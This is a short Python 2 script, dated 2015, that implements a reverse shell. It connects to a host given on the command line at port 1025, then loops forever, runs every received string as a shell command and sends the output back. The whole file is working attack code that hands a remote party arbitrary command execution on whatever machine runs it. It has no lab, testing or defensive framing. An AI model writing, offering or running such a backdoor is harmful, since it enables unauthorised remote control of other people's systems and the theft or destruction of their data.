'''
Created on May 30, 2015

@author: jxy
'''
import  socket,subprocess, sys

HOST = sys.argv[1]
PORT = 1025

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

print 'setup connect success'

while True:
    data = s.recv(1024)
    
    comm = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    STDOUT, STDERR = comm.communicate()
    
    s.send(STDOUT)
s.close()